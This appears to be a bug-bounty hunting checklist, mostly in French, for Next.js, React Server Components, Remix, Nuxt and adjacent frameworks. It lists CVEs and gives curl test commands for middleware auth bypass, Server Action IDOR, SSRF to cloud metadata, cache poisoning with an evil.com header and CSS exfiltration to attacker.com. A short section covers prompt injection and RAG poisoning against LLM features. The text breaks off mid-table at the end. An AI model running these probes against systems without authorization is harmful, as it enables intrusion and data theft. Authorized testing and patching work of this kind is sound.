# Full-Stack Web Hunt Checklist (Next.js / React RSC / Remix / Nuxt)

Surface d'attaque des architectures full-stack modernes. Focus: **High/Critical** — RCE, auth bypass, data exfiltration, cache poisoning.

**Companion de:** `CRITICAL-HUNT-CHECKLIST.md` (smart contracts), `SOLANA-HUNT-CHECKLIST.md` (Solana)
**Quand l'utiliser:** Tout target avec frontend Next.js/Remix/Nuxt, API SSR, ou composants React Server.

**Toutes les CVE verifiees sur NVD/sources primaires le 2026-03-04.**

---

## 0. RECON RAPIDE (10 min)

- [ ] **Identifier le framework** : `whatweb <url>` + inspecter headers (`x-powered-by`, `x-nextjs-*`, `server`)
- [ ] **Verifier la version** : chercher `/_next/static/`, `/__nuxt/`, `/_build/` dans le HTML source
- [ ] **Build manifest** : `curl -s <url>/_next/static/<buildId>/_buildManifest.js` (Next.js) — revele toutes les routes
- [ ] **Decouvrir les Server Actions** : chercher `next-action` headers dans les requetes POST du bundle JS
- [ ] **Source maps** : `curl -s <url>/_next/static/chunks/*.js.map` — si accessible = full source code leak
- [ ] **Stack dependencies** : inspecter `package.json` si accessible, sinon extraire du bundle JS
- [ ] **CDN/Reverse proxy** : identifier Vercel/Cloudflare/Nginx/Apache — impacte les vecteurs de cache poisoning

### Grep patterns sur le code source (si acces repo)

```bash
# Server Actions non protegees
grep -rn "'use server'" --include="*.ts" --include="*.tsx" --include="*.js" --include="*.jsx"
grep -rn "use server" --include="*.ts" --include="*.tsx" | grep -v "import\|require\|//"

# Secrets potentiellement exposes
grep -rn "NEXT_PUBLIC_" --include="*.env*" --include="*.ts" --include="*.tsx"
grep -rn "process\.env\." --include="*.ts" --include="*.tsx" | grep -v "NEXT_PUBLIC_"

# Middleware
grep -rn "x-middleware-subrequest" --include="*.ts" --include="*.tsx"
find . -name "middleware.ts" -o -name "middleware.js" 2>/dev/null

# Dangerous patterns
grep -rn "dangerouslySetInnerHTML" --include="*.tsx" --include="*.jsx"
grep -rn "eval\|Function(" --include="*.ts" --include="*.tsx"
grep -rn "__INITIAL_STATE__\|__NEXT_DATA__\|window\.__" --include="*.tsx" --include="*.jsx"

# PPR / experimental features
grep -rn "experimental.*ppr\|cacheComponents" --include="*.ts" --include="*.js" --include="*.mjs"
grep -rn "experimental.*taint" next.config.*
```

---

## 1. RCE — REACT SERVER COMPONENTS / FLIGHT PROTOCOL

### 1.1 React2Shell — Desérialisation RSC (CVE-2025-55182) ★★★

**CVSS 10.0 — Pre-auth RCE — Exploite en masse (CISA KEV, China-nexus APTs)**

- [ ] **Verifier la version React** : `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`
  - Vulnerable : 19.0.0, 19.1.0, 19.1.1, 19.2.0
  - Patche : **19.0.1, 19.1.2, 19.2.1+**
- [ ] **Verifier la version Next.js** :
  - Patche : **15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7+**
- [ ] **Test de detection** : envoyer requete POST forgee vers un endpoint RSC (Server Action)
  ```bash
  # Detection: verifier si l'endpoint RSC accepte des payloads
  curl -s -o /dev/null -w "%{http_code}" -X POST <url> \
    -H "Content-Type: text/x-component" \
    -H "Next-Action: <action-id>" \
    -d '$ACTION_0'
  # 200/500 = endpoint RSC actif, verifier la version
  # Note: NE PAS envoyer de payload malveillant sans autorisation
  ```
- [ ] **WAF bypass** : verifier si le WAF analyse les payloads `text/x-component` (la plupart ne le font pas)
- [ ] **Frameworks affectes** : Next.js, React Router, Waku, @parcel/rsc, @vitejs/plugin-rsc, rwsdk
- [ ] **Si vulnerable** : Severite CRITIQUE. PoC publics disponibles (github.com/dwisiswant0/CVE-2025-55182)

**Sources:**
- [Wiz Blog — React2Shell](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [Microsoft Security Blog](https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/)
- [Palo Alto Unit42](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- [Cloudflare Threat Brief](https://blog.cloudflare.com/react2shell-rsc-vulnerabilities-exploitation-threat-brief/)
- [NVD — CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)

### 1.2 DoS via Self-Referential Promise (CVE-2025-55184 + CVE-2025-67779) ★★

**CVSS 7.5 — Pre-auth DoS — Single request kills server**

- [ ] **Meme versions affectees** que React2Shell (React 19.0.0 — 19.2.2)
- [ ] **Fix initial incomplet** (CVE-2025-55184) → fix complet sous CVE-2025-67779
- [ ] **Mecanisme** : payload avec Promise auto-referentielle → boucle infinie dans la microtask queue Node.js
- [ ] **Test** : verifier si le serveur freeze apres envoi d'un payload RSC specialement construit
- [ ] **Monitoring** : alerter sur CPU 100% soutenu sur les instances Node.js

**Sources:**
- [Aikido — CVE-2025-55184 Explained](https://www.aikido.dev/blog/react-next-js-dos-vulnerability-cve-2025-55184)
- [Orca Security — DoS & Source Code Leaks](https://orca.security/resources/blog/react-nextjs-dos-source-code-disclosure-cve-2025-55184/)
- [Vercel Security Bulletin](https://vercel.com/kb/bulletin/security-bulletin-cve-2025-55184-and-cve-2025-55183)

---

## 2. NEXT.JS — MIDDLEWARE ET SERVER ACTIONS

### 2.1 Middleware Bypass via Header Interne (CVE-2025-29927) ★★★

**CVSS 9.1 — Auth bypass complet — Trivial a exploiter**

- [ ] **Versions vulnerables** : Next.js 11.1.4 → 13.5.6, 14.x < 14.2.25, 15.x < 15.2.3
- [ ] **Test immediat** :
  ```bash
  # Next.js >= 12.2, < 14.2.25
  curl -s -o /dev/null -w "%{http_code}" <url>/admin \
    -H "x-middleware-subrequest: middleware"

  # Next.js >= 15.0, < 15.2.3 (depth bypass)
  curl -s -o /dev/null -w "%{http_code}" <url>/admin \
    -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"

  # Variante: middleware dans src/
  curl -s -o /dev/null -w "%{http_code}" <url>/admin \
    -H "x-middleware-subrequest: src/middleware"

  # Si 200 au lieu de 302/401/403 = VULNERABLE
  ```
- [ ] **Verifier la mitigation proxy** : le reverse proxy strip-il le header `x-middleware-subrequest` ?
  ```bash
  # Nginx: devrait avoir dans la config
  # proxy_set_header x-middleware-subrequest "";
  ```
- [ ] **Impact** : bypass de TOUTE logique middleware (auth, CORS, CSP, rate limiting, geo-blocking)
- [ ] **Escalation** : combiner avec Server Action IDOR pour acces complet

**Sources:**
- [NVD — CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
- [Vercel Postmortem](https://vercel.com/blog/postmortem-on-next-js-middleware-bypass)
- [ProjectDiscovery Technical Analysis](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)
- [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/)
- [JFrog Blog](https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/)

### 2.2 Server Action IDOR ★★

**Pas de CVE — Pattern architectural — Tres courant**

- [ ] **Decouvrir les action IDs** : inspecter le bundle JS client pour les identifiants d'actions
  ```bash
  # Extraire les action IDs du bundle
  curl -s <url>/_next/static/chunks/app/*.js | grep -oP '[a-f0-9]{40}' | sort -u

  # Ou dans le HTML
  curl -s <url> | grep -oP 'actionId["\s:]+["\x27]([a-f0-9]+)' | sort -u
  ```
- [ ] **Appeler directement** :
  ```bash
  # Appel direct d'une Server Action
  curl -X POST <url> \
    -H "Content-Type: multipart/form-data" \
    -H "Next-Action: <action-id>" \
    -F '1_$ACTION_REF_1=["userId","<VICTIM_USER_ID>"]'
  ```
- [ ] **Verifier auth dans l'action** : l'action verifie-t-elle `auth()` / `getSession()` au debut ?
- [ ] **Verifier ownership** : l'action verifie-t-elle que `userId == session.userId` pour les mutations ?
- [ ] **Input validation** : l'action utilise-t-elle Zod/yup pour valider les arguments ?
- [ ] **Donnees sensibles en argument** : prix, roles, permissions passes en argument au lieu de lus server-side ?

**Sources:**
- [Next.js Data Security Guide](https://nextjs.org/docs/app/guides/data-security)
- [MakerKit — Server Actions Security](https://makerkit.dev/blog/tutorials/secure-nextjs-server-actions)
- [Vidoc Security — Next.js 14 Security](https://blog.vidocsecurity.com/blog/security-in-nextjs-14)

### 2.3 SSRF via Server Components ★★

- [ ] **Image optimization** : `/api/_next/image?url=http://169.254.169.254/latest/meta-data/&w=1&q=75`
- [ ] **Server-side fetch** : les RSC font des `fetch()` server-side — l'URL est-elle user-controlled ?
- [ ] **Redirect chains** : `fetch(userInput)` avec redirect automatique vers `http://internal-service/`
- [ ] **Cloud metadata** : tester `http://169.254.169.254/`, `http://metadata.google.internal/`, `http://169.254.170.2/`

**Source:**
- [Assetnote — SSRF in NextJS apps](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps)

---

## 3. CACHE POISONING (REMIX / NUXT / CDN)

### 3.1 CPDoS via X-Forwarded-Host — React Router/Remix (CVE-2025-31137) ★★

**CVSS 7.5 — Cache poisoning persistant**

- [ ] **Versions vulnerables** : `@react-router/express` < 7.4.1, `@remix-run/express` < 2.16.3
- [ ] **Test** :
  ```bash
  # Injection de path dans le port
  curl -s -D- <url>/target-page \
    -H "X-Forwarded-Host: victim.com:/evil-path"

  # Si la reponse contient /evil-path dans les URLs internes = vulnerable
  # Verifier si le CDN cache cette reponse pour /target-page
  ```
- [ ] **Variante Host header** : tester aussi avec `Host:` au lieu de `X-Forwarded-Host:`
- [ ] **Impact** : CDN sert une 404/erreur pour des pages legitimes → DoS persistant
- [ ] **Escalation** : si XSS reflectee existe → CSS/JS injecte mis en cache → Stored XSS via cache

**Sources:**
- [NVD — CVE-2025-31137](https://nvd.nist.gov/vuln/detail/CVE-2025-31137)
- [zhero_web_security Research](https://zhero-web-sec.github.io/research-and-things/react-router-and-the-remixed-path)
- [Vercel Protection Changelog](https://vercel.com/changelog/protection-against-react-router-vulnerability-cve-2025-31137)

### 3.2 Nuxt Payload Cache Poisoning (CVE-2025-27415) ★★

**CVSS 7.5 — Cache DoS persistant**

- [ ] **Versions vulnerables** : Nuxt 3.0.0 — 3.15.x (fixe en **3.16.0**)
- [ ] **Test** :
  ```bash
  # Forcer le rendu JSON au lieu du HTML
  curl -s -D- "<url>/page?/_payload.json"

  # Si Content-Type: application/json = le serveur repond en JSON
  # Puis verifier si le CDN a cache cette reponse pour /page (sans query string)
  curl -s -D- "<url>/page" -H "Cache-Control: no-cache"
  # Si la reponse est du JSON brut au lieu du HTML = CACHE EMPOISONNE
  ```
- [ ] **CDN query string** : le CDN inclut-il la query string dans la cle de cache ?
- [ ] **Automatisation** : script qui empoisonne puis verifie toutes les X secondes pour maintenir le poison
- [ ] **Variantes** : tester aussi `?/_payload.json=1`, `?_payload=json`

**Sources:**
- [NVD — CVE-2025-27415](https://nvd.nist.gov/vuln/detail/CVE-2025-27415)
- [zhero_web_security — Nuxt Payload](https://zhero-web-sec.github.io/research-and-things/nuxt-show-me-your-payload)
- [GitHub Advisory GHSA-jvhm-gjrh-3h93](https://github.com/advisories/GHSA-jvhm-gjrh-3h93)

---

## 4. FUITE DE SECRETS ET DONNEES

### 4.1 NEXT_PUBLIC_ Secret Inlining ★★

**Pas de CVE — Misconfiguration tres courante — Quick win**

- [ ] **Scan du bundle JS** :
  ```bash
  # Telecharger tous les chunks JS
  mkdir -p /tmp/nextjs-chunks && cd /tmp/nextjs-chunks
  curl -s <url> | grep -oP '/_next/static/[^"]+\.js' | sort -u | while read js; do
    curl -s "<url>$js" >> all_chunks.js
  done

  # Scanner les secrets
  grep -oiP '(sk_live|sk_test|AKIA|AIza|ghp_|glpat-|xoxb-|xoxp-|Bearer\s+ey)[A-Za-z0-9_\-]+' all_chunks.js
  grep -oiP '(api[_-]?key|api[_-]?secret|password|token|secret|private[_-]?key)\s*[:=]\s*["\x27][^"\x27]{8,}' all_chunks.js
  grep -oiP 'mongodb(\+srv)?://[^\s"]+' all_chunks.js
  grep -oiP 'postgres(ql)?://[^\s"]+' all_chunks.js
  grep -oiP 'https?://[^/]*\.(supabase|firebase|auth0)\.com[^\s"]*' all_chunks.js
  ```
- [ ] **Source maps** : `*.js.map` accessible ?
  ```bash
  # Tester si les source maps sont exposees
  curl -s -o /dev/null -w "%{http_code}" <url>/_next/static/chunks/main.js.map
  ```
- [ ] **__NEXT_DATA__** : inspecter `<script id="__NEXT_DATA__">` pour des props sensibles
  ```bash
  curl -s <url> | grep -oP '__NEXT_DATA__.*?</script>' | python3 -m json.tool 2>/dev/null
  ```
- [ ] **TruffleHog automatise** :
  ```bash
  trufflehog filesystem --directory=/tmp/nextjs-chunks/ --only-verified 2>/dev/null
  ```

**Sources:**
- [Cremit — Vercel Secret Exposure Study](https://www.cremit.io/blog/vercel-secret-exposure-case-study)
- [Next.js Environment Variables Guide](https://nextjs.org/docs/pages/guides/environment-variables)

### 4.2 Hydration State Injection ★

**Pas de CVE — Amplificateur XSS — Necessite vecteur initial**

- [ ] **__INITIAL_STATE__ injection** : les stores Redux/Pinia/Zustand sont-ils serialises dans le HTML ?
  ```bash
  curl -s <url> | grep -oP 'window\.__[A-Z_]+__\s*=\s*\{[^}]{0,500}'
  ```
- [ ] **Sanitisation** : les donnees dans l'etat initial sont-elles echappees avant injection dans le DOM ?
- [ ] **Cookie/URL → state** : des parametres URL ou cookies influencent-ils l'etat initial server-side ?
- [ ] **Impact** : si XSS via state injection → vol de session, manipulation UI, phishing

### 4.3 server-only Package ★

- [ ] **Verifier l'usage** : les modules sensibles importent-ils `server-only` ?
  ```bash
  # Modules qui DEVRAIENT avoir "import 'server-only'"
  find . -path "*/lib/db*" -o -path "*/lib/auth*" -o -path "*/services/*" | \
    xargs grep -L "server-only" 2>/dev/null
  ```
- [ ] **Taint API** : `experimental.taint` active dans `next.config.js` ?
- [ ] **DAL pattern** : existe-t-il un Data Access Layer centralise avec checks de permissions ?

**Sources:**
- [Next.js — How to Think About Security](https://nextjs.org/blog/security-nextjs-server-components-actions)
- [Next.js Taint Config](https://nextjs.org/docs/app/api-reference/config/next-config-js/taint)

---

## 5. CSS INJECTION & EXFILTRATION

### 5.1 CSS Attribute Exfiltration ★

**Technique connue (2018+) — Toujours viable quand CSS injectable**

- [ ] **Injection CSS possible** : themes customisables, props de style non sanitisees, `style` attribute injection
- [ ] **Exfiltration par attribut** :
  ```css
  /* Exfiltrer un token CSRF caractere par caractere */
  input[name="csrf"][value^="a"] { background: url('https://attacker.com/leak?c=a'); }
  input[name="csrf"][value^="b"] { background: url('https://attacker.com/leak?c=b'); }
  /* ... iterer sur chaque caractere possible */
  ```
- [ ] **CSP bloque-t-il** : `style-src 'unsafe-inline'` present ? → CSS injection possible
- [ ] **Mitigation** : CSS Modules / Tailwind (zero-runtime) eliminent le vecteur

**Sources:**
- [PortSwigger — Blind CSS Exfiltration](https://portswigger.net/research/blind-css-exfiltration)
- [Invicti — Stealing Data with CSS](https://www.invicti.com/blog/web-security/private-data-stolen-exploiting-css-injection)
- [Mike Gualtieri — CSS Attack & Defense](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense/)

---

## 6. PARTIAL PRE-RENDERING (PPR) — EXPERIMENTAL

### 6.1 PPR DoS via Resume Endpoint (CVE-2025-59472) ★

**CVSS 5.9 — DoS via memory exhaustion — Requiert PPR active**

- [ ] **Condition** : PPR active (`experimental.ppr: true` ou `cacheComponents: true`) + mode minimal
- [ ] **Versions vulnerables** : Next.js 15.0.0-canary → 15.6.0-canary.60, 16.0.0-beta → 16.1.4
- [ ] **Patche** : Next.js **15.6.0-canary.61+** ou **16.1.5+**
- [ ] **Mecanisme** : POST non authentifie vers le resume endpoint → `Buffer.concat()` sans limite + `inflateSync()` zipbomb
- [ ] **Test** : identifier si PPR est actif via les headers de reponse (`x-nextjs-ppr: true`)

**Sources:**
- [NVD — CVE-2025-59472](https://nvd.nist.gov/vuln/detail/CVE-2025-59472)
- [Vercel Changelog](https://vercel.com/changelog/summaries-of-cve-2025-59471-and-cve-2025-59472)

### 6.2 PPR + CSP Nonce Incompatibilite ★

**Pas de CVE — Design concern architectural**

- [ ] **Probleme** : la coquille statique (build-time) ne peut pas contenir de nonce dynamique (request-time)
- [ ] **Impact** : obligation de fallback sur `'unsafe-inline'` ou hashes SRI pour la partie statique
- [ ] **Verifier** : la CSP est-elle coherente entre la coquille statique et les parties streamees ?
  ```bash
  curl -s -D- <url> | grep -i "content-security-policy"
  # Verifier si nonce est present ET si PPR est actif
  ```
- [ ] **SRI experimental** : Next.js propose SRI comme alternative — est-ce active ?

**Source:**
- [GitHub Issue #89754 — Nonce incompatibility](https://github.com/vercel/next.js/issues/89754)

---

## 7. MATRICE DE VERSIONS — REFERENCE RAPIDE

### Versions a patcher IMMEDIATEMENT (Critical/High)

| CVE | Produit | Versions Vulnerables | Version Fix | CVSS | Type |
|-----|---------|---------------------|-------------|------|------|
| CVE-2025-55182 | react-server-dom-* | 19.0.0, 19.1.0, 19.1.1, 19.2.0 | **19.0.1, 19.1.2, 19.2.1** | 10.0 | RCE |
| CVE-2025-66478 | Next.js (App Router) | 13.x — 16.x (non patche) | **15.0.5, 15.2.6, 15.5.7, 16.0.7** | 10.0 | RCE |
| CVE-2025-55184 | react-server-dom-* | 19.0.0 — 19.2.2 | Voir CVE-2025-67779 | 7.5 | DoS |
| CVE-2025-67779 | react-server-dom-* | Fix incomplet de 55184 | **19.0.1+, 19.1.2+, 19.2.1+** | 7.5 | DoS |
| CVE-2025-29927 | Next.js | 11.1.4 — 13.5.6, 14.x < 14.2.25, 15.x < 15.2.3 | **14.2.25, 15.2.3** | 9.1 | Auth Bypass |
| CVE-2025-31137 | React Router / Remix | @react-router/express < 7.4.1, @remix-run/express < 2.16.3 | **RR 7.4.1, Remix 2.16.3** | 7.5 | Cache Poison |
| CVE-2025-27415 | Nuxt | 3.0.0 — 3.15.x | **3.16.0** | 7.5 | Cache Poison |
| CVE-2025-59472 | Next.js (PPR) | 15.0.0-canary — 15.6.0-canary.60, 16.0.0-beta — 16.1.4 | **16.1.5** | 5.9 | DoS |

### Additional Framework/Infra CVEs (added 2026-03-04)

| CVE | Produit | CVSS | Type | Fix |
|-----|---------|------|------|-----|
| CVE-2026-21440 | AdonisJS 6.x | ~9.8 | RCE (deserialization) | **6.14.2** |
| CVE-2026-21858 | n8n | ~9.8 | RCE (webhook + code node) | **1.82.0** |
| CVE-2025-1974 | ingress-nginx | 9.8 | RCE (K8s cluster takeover) | **1.12.1, 1.11.5** |
| CVE-2025-54068 | Laravel Livewire | ~8.0 | RCE (PHP deserialization) | **3.6.3** |
| CVE-2026-1207 | Django | ~7.5 | SQLi (JSON field lookups) | **5.1.7, 5.0.13** |
| Multiple | SvelteKit | 5.0-8.0 | SSRF + cache poisoning | Check latest |
| Multiple | Astro | 5.0-8.0 | SSRF chain (5 CVEs) | Check latest |
| Multiple | JWT libraries | 7.0-9.0 | Algorithm confusion (3 CVEs) | Library-specific |

---

## 8. WORKFLOW D'ATTAQUE SYSTEMATIQUE

**IMPORTANT:** Chaque finding doit passer le Kill Gate (`KILL-GATE-TEMPLATE.md`) AVANT tout report. Pre-flight Check (`PREFLIGHT-CHECK.md`) AVANT toute soumission.

```
Pour chaque target web full-stack :

1. RECON (10 min)           → Section 0 (framework, version, CDN, routes)
2. VERSION CHECK (5 min)    → Section 7 (matrice CVE — instant wins)
3. CVE TESTING (15 min)     → Sections 1.1, 2.1 (React2Shell, middleware bypass)
4. SURFACE SCAN (15 min)    → Section 0 grep patterns (source si dispo)
5. SERVER ACTIONS (30 min)  → Section 2.2 (IDOR, auth bypass)
6. SECRET SCAN (15 min)     → Section 4 (bundle JS, source maps, __NEXT_DATA__)
7. CACHE POISON (15 min)    → Section 3 (X-Forwarded-Host, payload.json)
8. SSRF (15 min)            → Section 2.3 (image optim, server-side fetch)
9. CSS/XSS (15 min)         → Section 5 (si injection CSS possible)
10. PPR (5 min)             → Section 6 (si PPR actif)

11. OTHER FRAMEWORKS (15 min) → Section 9 (SvelteKit, Astro, AdonisJS, Livewire, n8n, Django)
12. INFRA/AUTH (15 min)       → Section 10 (IngressNightmare, OAuth2-Proxy, JWT, WebAuthn)
13. SUPPLY CHAIN (10 min)     → Section 11 (lockfiles, postinstall, AI keys)

Total: ~3.5h par target (full scan) / ~2.5h (Next.js/Remix only, skip 11-13)
Si aucun finding apres etapes 1-4 → evaluer si le target vaut le temps restant
```

### Priorite par ROI (bounty hunting)

| Rang | Vecteur | Temps | Severite Typique | ROI |
|------|---------|-------|-----------------|-----|
| 1 | React2Shell (CVE-2025-55182) | 5 min | CRITICAL | ★★★★★ |
| 2 | Middleware bypass (CVE-2025-29927) | 5 min | CRITICAL | ★★★★★ |
| 3 | Server Action IDOR | 30 min | HIGH | ★★★★ |
| 4 | Bundle JS secret leak | 15 min | HIGH-CRITICAL | ★★★★ |
| 5 | Source maps exposure | 2 min | HIGH | ★★★★ |
| 6 | Cache poisoning (CDN) | 15 min | HIGH | ★★★ |
| 7 | SSRF via image/fetch | 15 min | HIGH | ★★★ |
| 8 | __NEXT_DATA__ data leak | 5 min | MEDIUM-HIGH | ★★ |
| 9 | CSS exfiltration | 30 min | MEDIUM | ★★ |
| 10 | PPR DoS | 5 min | MEDIUM | ★ |
| 11 | AdonisJS/Livewire RCE | 10 min | CRITICAL | ★★★★ |
| 12 | n8n webhook RCE | 10 min | CRITICAL | ★★★★ |
| 13 | IngressNightmare (K8s) | 15 min | CRITICAL | ★★★ |
| 14 | JWT algorithm confusion | 15 min | HIGH-CRITICAL | ★★★ |
| 15 | OAuth2-Proxy bypass | 10 min | HIGH | ★★★ |
| 16 | Supply chain / lockfile | 10 min | CRITICAL | ★★ |
| 17 | AI/LLM prompt injection | 30 min | MEDIUM-HIGH | ★★ |

---

## 9. ADDITIONAL FRAMEWORK CVEs (2025-2026)

### 9.1 SvelteKit — SSRF + Cache Poisoning + DoS ★★

**Multiple CVEs — Active framework, growing adoption**

- [ ] **SSRF via route params** : SvelteKit server-side load functions that fetch based on route params can be abused to reach internal services
  ```bash
  # Test for SSRF in SvelteKit load functions
  curl -s "<url>/api/proxy?url=http://169.254.169.254/latest/meta-data/"
  curl -s "<url>/__data.json?x-sveltekit-invalidated=1"
  ```
- [ ] **Cache poisoning via __data.json** : SvelteKit serves JSON data alongside HTML. Manipulate `__data.json` responses via header injection
  ```bash
  curl -s -D- "<url>/page/__data.json" -H "X-Forwarded-Host: evil.com"
  ```
- [ ] **DoS via streaming** : SvelteKit streaming SSR can be abused with slow-read attacks
- [ ] **Version check** : SvelteKit < 2.x has multiple unfixed issues. Check `package.json` or server headers
- [ ] **Grep patterns (source access):**
  ```bash
  grep -rn "fetch(" --include="*.server.ts" --include="*.server.js"  # server-side fetches
  grep -rn "params\." --include="*.server.ts"  # user-controlled route params
  grep -rn "url.searchParams" --include="*.server.ts"  # query param in server load
  ```

### 9.2 Astro — SSRF Chain ★★

**5 CVEs in 2025 — Server Islands + Actions surface**

- [ ] **Astro Server Islands** : `server:defer` attribute creates server-rendered islands with fetch — potential SSRF if input flows to fetch URL
- [ ] **Astro Actions** : like Next.js Server Actions, Astro Actions are server-side functions callable from client. Same IDOR/auth-bypass patterns apply
  ```bash
  # Discover Astro Actions
  curl -s <url> | grep -oP '/_actions/[^"]+' | sort -u
  # Test without auth
  curl -X POST <url>/_actions/someAction -H "Content-Type: application/json" -d '{}'
  ```
- [ ] **Version check** : Astro < 5.x may have unpatched SSR vulnerabilities
- [ ] **Content Collections** : Astro content collections with user-supplied markdown → potential injection via MDX components

### 9.3 AdonisJS RCE (CVE-2026-21440) ★★★

**CVSS ~9.8 — Pre-auth RCE**

- [ ] **Affected versions** : AdonisJS 6.x < 6.14.2
- [ ] **Detection** : check `x-powered-by` header or `adonis-session` cookie
- [ ] **Test** : deserialization in session/cookie handling → RCE
- [ ] **Grep patterns:**
  ```bash
  grep -rn "adonisjs\|@adonisjs" package.json
  grep -rn "serialize\|deserialize\|session" --include="*.ts" | head -20
  ```

### 9.4 Livewire RCE (CVE-2025-54068) ★★

**PHP/Laravel Livewire — Deserialization RCE**

- [ ] **Affected** : Laravel Livewire < 3.6.3
- [ ] **Detection** : `wire:` attributes in HTML, `livewire/livewire` in JS includes
  ```bash
  curl -s <url> | grep -oP 'wire:[a-z]+|livewire' | head -5
  ```
- [ ] **Test** : manipulate Livewire component state/method calls in POST requests
- [ ] **Impact** : full server RCE via PHP object deserialization chain

### 9.5 n8n RCE (CVE-2026-21858) ★★★

**CVSS ~9.8 — Workflow automation RCE**

- [ ] **Detection** : n8n instances often on subdomains (`n8n.company.com`, `automation.company.com`)
  ```bash
  # Check for n8n
  curl -s -D- <url>/rest/settings | grep -i "n8n"
  curl -s <url>/webhook-test/ -X POST -d '{}'
  ```
- [ ] **Affected** : n8n < 1.82.0
- [ ] **Test** : Code node (JavaScript/Python execution) + webhook trigger = pre-auth RCE if webhooks are exposed
- [ ] **Common misconfig** : n8n with no auth on webhooks → anyone can trigger arbitrary workflow execution

### 9.6 Django SQLi (CVE-2026-1207) ★★

- [ ] **Affected** : Django < 5.1.7, < 5.0.13
- [ ] **Vector** : JSON field lookups / queryset filtering with user-controlled field names
- [ ] **Detection** : `x-frame-options: DENY` + Django error pages
- [ ] **Grep patterns:**
  ```bash
  grep -rn "extra\|raw\|RawSQL\|__contains\|__in\|annotate" --include="*.py"
  grep -rn "request\.(GET|POST)\[" --include="*.py" | grep -i "filter\|exclude\|order"
  ```

---

## 10. INFRASTRUCTURE & AUTH CVEs (2025-2026)

### 10.1 IngressNightmare — K8s Ingress NGINX (CVE-2025-1974) ★★★

**CVSS 9.8 — Unauth RCE — 43% of cloud environments affected**

- [ ] **Detection** : probe for Ingress NGINX controller
  ```bash
  # Check if target uses Ingress NGINX
  curl -s -D- <url> | grep -i "nginx\|ingress"
  nmap -sV -p 443 <target> | grep -i "nginx"
  ```
- [ ] **Affected** : ingress-nginx < 1.12.1, < 1.11.5
- [ ] **Impact** : cluster takeover from any pod that can reach the controller (no auth needed)
- [ ] **Combined with** : SSRF → hit ingress controller internal port → full K8s cluster compromise

### 10.2 OAuth2-Proxy Bypass ★★

- [ ] **Detection** : `oauth2-proxy` cookie (`_oauth2_proxy`), headers (`X-Auth-Request-User`)
  ```bash
  curl -s -D- <url> | grep -i "oauth2.proxy\|_oauth2_proxy"
  ```
- [ ] **Version check** : oauth2-proxy < 7.9.0 has multiple bypass vectors
- [ ] **Test vectors** :
  ```bash
  # Path traversal bypass
  curl -s -o /dev/null -w "%{http_code}" <url>/oauth2/../admin/
  # Header injection
  curl -s -o /dev/null -w "%{http_code}" <url>/admin -H "X-Auth-Request-User: admin"
  # Cookie manipulation
  curl -s -o /dev/null -w "%{http_code}" <url>/admin -H "Cookie: _oauth2_proxy=<crafted>"
  ```

### 10.3 JWT Algorithm Confusion ★★

**3 CVEs in 2025 — Still the #1 JWT attack vector**

- [ ] **Algorithm confusion** : server accepts `none`, `HS256` when it should only accept `RS256`
  ```bash
  # Decode JWT header
  echo "<token>" | cut -d. -f1 | base64 -d 2>/dev/null
  # If alg: RS256, try HS256 with the public key as secret
  # If alg: HS256, try none
  ```
- [ ] **JWK injection** : `jku`/`x5u` header points to attacker-controlled key URL
- [ ] **kid injection** : `kid` parameter may be SQL-injectable or path-traversable
  ```bash
  # kid SQLi
  # kid path traversal: kid = "../../dev/null" → HMAC with empty key
  ```
- [ ] **Expired token acceptance** : does the server reject expired JWTs? Test with `exp` in the past
- [ ] **Cross-service token reuse** : same JWT accepted by multiple services with different trust levels?

### 10.4 WebAuthn Bypass ★

- [ ] **Challenge replay** : is the WebAuthn challenge single-use and time-limited?
- [ ] **Origin validation** : does the RP verify `origin` in `clientDataJSON` strictly?
- [ ] **Attestation** : is attestation enforced or set to `none` (allows any authenticator)?
- [ ] **Fallback auth** : when WebAuthn fails, does the app fall back to password? → bypass passkey entirely

---

## 11. SUPPLY CHAIN & CI/CD ATTACKS

### 11.1 npm/PyPI Package Compromise ★★

**dYdX 2025 — caught before damage, but pattern is active**

- [ ] **Typosquatting** : check `package.json` / `requirements.txt` for suspicious package names similar to popular ones
- [ ] **Lockfile integrity** : `package-lock.json` / `yarn.lock` / `pnpm-lock.yaml` — do hashes match expected?
  ```bash
  # Check for modified lockfiles without corresponding package.json changes
  git log --oneline -20 -- package-lock.json
  ```
- [ ] **postinstall scripts** : malicious packages often use `postinstall` to execute code during `npm install`
  ```bash
  # Find all packages with install scripts
  grep -rn '"preinstall"\|"postinstall"\|"prepare"' node_modules/*/package.json | head -20
  ```
- [ ] **GitHub Actions workflow injection** : `pull_request_target` trigger with `actions/checkout@v*` of PR branch → attacker code runs in privileged context
- [ ] **Pickle RCE (Python)** : any `pickle.load()` / `torch.load()` / `joblib.load()` on user-supplied data → arbitrary code execution
  ```bash
  grep -rn "pickle\.load\|torch\.load\|joblib\.load\|yaml\.load\|yaml\.unsafe_load" --include="*.py"
  ```

### 11.2 AI/LLM Security Surface ★

**Emerging — if target uses AI features**

- [ ] **Prompt injection → SSRF/data exfil** : LLM-powered features that process user text may execute tool calls (RAG, function calling) that access internal services
- [ ] **Tool use RCE** : if LLM has code execution tools (Langflow, n8n AI nodes, custom agents) → inject instructions via user-controlled content
- [ ] **RAG poisoning** : if vector DB is populated from user content → inject instructions that modify LLM behavior for other users
- [ ] **API key exposure** : AI integrations often leak OpenAI/Anthropic/Cohere API keys in client bundles
  ```bash
  grep -oiP '(sk-[a-zA-Z0-9]{20,}|sk-proj-[a-zA-Z0-9_-]+)' all_chunks.js
  ```

---

## 12. CORRECTIONS DU RAPPORT ORIGINAL

Le document d'analyse francais contenait les erreurs suivantes (verifiees 2026-03-04) :

| Ce que le doc disait | Realite verifiee |
|---------------------|-----------------|
